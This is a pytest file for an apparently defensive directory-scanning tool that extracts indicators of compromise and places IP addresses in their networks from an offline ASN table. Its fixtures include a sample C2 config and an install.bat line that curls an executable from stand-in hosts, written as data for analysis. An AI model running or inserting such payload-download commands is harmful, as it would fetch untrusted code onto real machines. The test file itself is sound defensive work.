"""Which network an address belongs to, answered from a file on disk.

Nothing in here resolves anything or asks anyone. The dataset is a table the
analyst already has; a lookup is a binary search over it, so an address found in
a file can be placed without telling the internet you found it.
"""

from __future__ import annotations

import gzip
from pathlib import Path

from dirsift.asn import AsnTable

#: The shape iptoasn publishes: start, end, AS number, country, AS name.
ROWS = [
    "1.0.0.0\t1.0.0.255\t13335\tUS\tCLOUDFLARENET",
    "203.0.113.0\t203.0.113.255\t64496\tNL\tEXAMPLE-HOSTING",
    "198.51.100.0\t198.51.100.127\t64497\tDE\tTEST-NET-2-LOWER",
    "2001:db8::\t2001:db8:0:ffff:ffff:ffff:ffff:ffff\t64498\tFR\tDOCUMENTATION-V6",
]


def table_file(tmp_path: Path, rows=ROWS, name="ip2asn.tsv") -> Path:
    path = tmp_path / name
    path.write_text("\n".join(rows) + "\n", encoding="utf-8")
    return path


def test_an_address_lands_in_its_network(tmp_path: Path):
    table = AsnTable.load(table_file(tmp_path))
    found = table.lookup("203.0.113.24")
    assert found is not None
    assert found.asn == 64496
    assert found.country == "NL"
    assert found.name == "EXAMPLE-HOSTING"


def test_the_edges_of_a_range_are_inside_it(tmp_path: Path):
    table = AsnTable.load(table_file(tmp_path))
    assert table.lookup("198.51.100.0").asn == 64497
    assert table.lookup("198.51.100.127").asn == 64497
    assert table.lookup("198.51.100.128") is None  # one past the end


def test_an_address_in_no_range_comes_back_empty(tmp_path: Path):
    table = AsnTable.load(table_file(tmp_path))
    assert table.lookup("10.0.0.1") is None


def test_ipv6_is_looked_up_the_same_way(tmp_path: Path):
    table = AsnTable.load(table_file(tmp_path))
    found = table.lookup("2001:db8::dead:beef")
    assert found is not None
    assert found.asn == 64498
    assert found.country == "FR"


def test_a_gzipped_table_is_read_without_unpacking_it(tmp_path: Path):
    path = tmp_path / "ip2asn.tsv.gz"
    with gzip.open(path, "wt", encoding="utf-8") as handle:
        handle.write("\n".join(ROWS) + "\n")
    table = AsnTable.load(path)
    assert table.lookup("1.0.0.7").name == "CLOUDFLARENET"


def test_rows_with_no_announcement_are_skipped(tmp_path: Path):
    """iptoasn writes unrouted space as AS 0, which is an answer of no use."""
    rows = ROWS + ["192.0.2.0\t192.0.2.255\t0\tNone\tNot routed"]
    table = AsnTable.load(table_file(tmp_path, rows))
    assert table.lookup("192.0.2.1") is None


def test_the_table_says_where_it_came_from_and_when(tmp_path: Path):
    path = table_file(tmp_path)
    table = AsnTable.load(path)
    assert path.name in table.source
    assert table.stamp.startswith("20")  # an ISO date, so a run can be read later


def test_a_missing_file_is_not_an_error_but_an_empty_table(tmp_path: Path):
    """Most people will not have the dataset, and a scan must not care."""
    table = AsnTable.load(tmp_path / "nothing-here.tsv")
    assert table.empty
    assert table.lookup("203.0.113.24") is None


# What a run does with the table


def test_indicators_are_placed_in_their_networks(tmp_path: Path):
    from dirsift.analyze import analyze
    from dirsift.models import Entry, ScanResult

    result = ScanResult(
        root_url="http://203.0.113.24/files/",
        entries=[
            Entry(
                url="http://203.0.113.24/files/config.json",
                name="config.json",
                depth=1,
                fetched_bytes=80,
                text_preview='{"c2": "203.0.113.24", "gate": "198.51.100.77:8443"}',
            )
        ],
    )
    result, _ = analyze(result, asn_table=AsnTable.load(table_file(tmp_path)))

    placed = {ioc.value: ioc for ioc in result.iocs if ioc.ioc_type == "ipv4"}
    assert placed["203.0.113.24"].asn == 64496
    assert placed["203.0.113.24"].country == "NL"
    assert placed["203.0.113.24"].as_name == "EXAMPLE-HOSTING"
    # An address written with a port still belongs to its network.
    assert placed["198.51.100.77:8443"].asn == 64497


def test_a_run_without_the_dataset_is_unchanged(tmp_path: Path):
    from dirsift.analyze import analyze
    from dirsift.models import Entry, ScanResult

    result = ScanResult(
        root_url="http://203.0.113.24/files/",
        entries=[
            Entry(
                url="http://203.0.113.24/files/note.txt",
                name="note.txt",
                depth=1,
                fetched_bytes=40,
                text_preview="gate 203.0.113.24",
            )
        ],
    )
    result, _ = analyze(result, asn_table=AsnTable.load(tmp_path / "absent.tsv"))
    assert all(ioc.asn is None for ioc in result.iocs)


def test_the_run_records_which_table_answered(tmp_path: Path):
    from dirsift.analyze import analyze
    from dirsift.models import Entry, ScanResult

    result = ScanResult(
        root_url="http://203.0.113.24/files/",
        entries=[
            Entry(
                url="http://203.0.113.24/files/note.txt",
                name="note.txt",
                depth=1,
                fetched_bytes=40,
                text_preview="gate 203.0.113.24",
            )
        ],
    )
    table = AsnTable.load(table_file(tmp_path))
    result, _ = analyze(result, asn_table=table)
    assert result.asn_source == table.source
    assert result.asn_stamp == table.stamp


def test_the_walk_records_the_address_it_talked_to(tmp_path: Path):
    """The connection went there anyway, so the run says where it went."""
    import http.server
    import socketserver
    import threading
    from functools import partial

    from dirsift.fetcher import MIN_DELAY
    from dirsift.walker import ScanOptions, scan

    (tmp_path / "note.txt").write_bytes(b"gate 203.0.113.24\n")

    class Quiet(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *args):
            pass

    httpd = socketserver.TCPServer(("127.0.0.1", 0), partial(Quiet, directory=str(tmp_path)))
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    try:
        url = f"http://127.0.0.1:{httpd.server_address[1]}/"
        result = scan(url, ScanOptions(depth=1, delay=MIN_DELAY, allow_private=True))
    finally:
        httpd.shutdown()
        httpd.server_close()

    assert result.target_ip == "127.0.0.1"


def test_the_report_places_the_addresses_it_printed(tmp_path: Path):
    from dirsift.models import Ioc, ScanResult
    from dirsift.report import render_markdown

    result = ScanResult(
        root_url="http://203.0.113.24/files/",
        target_ip="203.0.113.24",
        target_asn=64496,
        target_as_name="EXAMPLE-HOSTING",
        target_country="NL",
        asn_source="ip2asn-combined.tsv",
        asn_stamp="2026-09-16",
        iocs=[
            Ioc(
                ioc_type="ipv4",
                value="198.51.100.77",
                defanged="198[.]51[.]100[.]77",
                source_url="http://203.0.113.24/files/config.json",
                asn=64497,
                as_name="TEST-NET-HOSTING",
                country="DE",
            )
        ],
    )
    markdown = render_markdown(result, [])
    assert "AS64496" in markdown
    assert "EXAMPLE-HOSTING" in markdown
    assert "AS64497" in markdown
    assert "ip2asn-combined.tsv" in markdown


def test_a_placement_survives_being_reopened_without_the_table(tmp_path: Path):
    """The run was placed against a dated table; another machine still reads it."""
    from dirsift.analyze import analyze
    from dirsift.models import Entry, ScanResult

    result = ScanResult(
        root_url="http://203.0.113.24/files/",
        entries=[
            Entry(
                url="http://203.0.113.24/files/note.txt",
                name="note.txt",
                depth=1,
                fetched_bytes=40,
                text_preview="gate 203.0.113.24",
            )
        ],
    )
    result, _ = analyze(result, asn_table=AsnTable.load(table_file(tmp_path)))
    assert result.iocs[0].asn == 64496

    # Reopened where no dataset exists: the answer is still on the record.
    result, _ = analyze(result, asn_table=AsnTable.load(tmp_path / "absent.tsv"))
    assert result.iocs[0].asn == 64496
    assert result.iocs[0].as_name == "EXAMPLE-HOSTING"


def test_a_url_pointing_at_an_address_is_placed_too(tmp_path: Path):
    """A link to a bare address is the same host, written another way."""
    from dirsift.analyze import analyze
    from dirsift.models import Entry, ScanResult

    result = ScanResult(
        root_url="http://203.0.113.24/files/",
        entries=[
            Entry(
                url="http://203.0.113.24/files/install.bat",
                name="install.bat",
                depth=1,
                fetched_bytes=60,
                text_preview="curl -o svc.exe http://198.51.100.9:8080/bin/svc.exe",
            )
        ],
    )
    result, _ = analyze(result, asn_table=AsnTable.load(table_file(tmp_path)))
    urls = [ioc for ioc in result.iocs if ioc.ioc_type == "url"]
    assert urls and urls[0].asn == 64497
    assert urls[0].country == "DE"


def test_a_url_with_a_name_for_a_host_is_left_alone(tmp_path: Path):
    """Placing that would mean resolving it, which is a question asked of a stranger."""
    from dirsift.analyze import analyze
    from dirsift.models import Entry, ScanResult

    result = ScanResult(
        root_url="http://203.0.113.24/files/",
        entries=[
            Entry(
                url="http://203.0.113.24/files/install.bat",
                name="install.bat",
                depth=1,
                fetched_bytes=60,
                text_preview="curl -o svc.exe http://panel.example.org/bin/svc.exe",
            )
        ],
    )
    result, _ = analyze(result, asn_table=AsnTable.load(table_file(tmp_path)))
    assert all(ioc.asn is None for ioc in result.iocs)


def test_a_target_written_as_an_address_needs_no_resolving(tmp_path: Path):
    """An older run has no resolved address, but its URL may already be one."""
    from dirsift.analyze import analyze
    from dirsift.models import ScanResult

    result = ScanResult(root_url="http://203.0.113.24:8080/files/")
    result, _ = analyze(result, asn_table=AsnTable.load(table_file(tmp_path)))
    assert result.target_ip == "203.0.113.24"
    assert result.target_asn == 64496
    assert result.target_country == "NL"


def test_a_target_written_as_a_name_stays_unresolved(tmp_path: Path):
    from dirsift.analyze import analyze
    from dirsift.models import ScanResult

    result = ScanResult(root_url="http://files.example.org/pub/")
    result, _ = analyze(result, asn_table=AsnTable.load(table_file(tmp_path)))
    assert result.target_ip is None
    assert result.target_asn is None


# A run keeps the answers it was given

#: The same range, announced by someone else in a later table.
MOVED = ["203.0.113.0\t203.0.113.255\t65001\tUS\tLATER-OWNER"]


def placed_run(tmp_path: Path):
    from dirsift.analyze import analyze
    from dirsift.models import Entry, ScanResult

    result = ScanResult(
        root_url="http://203.0.113.24/files/",
        entries=[
            Entry(
                url="http://203.0.113.24/files/note.txt",
                name="note.txt",
                depth=1,
                fetched_bytes=40,
                text_preview="gate 203.0.113.24",
            )
        ],
    )
    first = AsnTable.load(table_file(tmp_path, name="first.tsv"))
    result, _ = analyze(result, asn_table=first)
    return result, first


def test_a_reopened_run_keeps_the_table_it_was_placed_with(tmp_path: Path):
    """The page must not swap the scan's dated table for whatever this machine has."""
    from dirsift.analyze import analyze

    result, first = placed_run(tmp_path)
    later = AsnTable.load(table_file(tmp_path, MOVED, name="later.tsv"))
    result, _ = analyze(result, asn_table=later)
    assert result.asn_source == first.source
    assert result.asn_stamp == first.stamp


def test_a_reopened_run_keeps_the_networks_it_was_placed_in(tmp_path: Path):
    from dirsift.analyze import analyze

    result, _ = placed_run(tmp_path)
    later = AsnTable.load(table_file(tmp_path, MOVED, name="later.tsv"))
    result, _ = analyze(result, asn_table=later)
    assert result.iocs[0].asn == 64496
    assert result.iocs[0].as_name == "EXAMPLE-HOSTING"
    assert result.target_asn == 64496
    assert result.target_country == "NL"
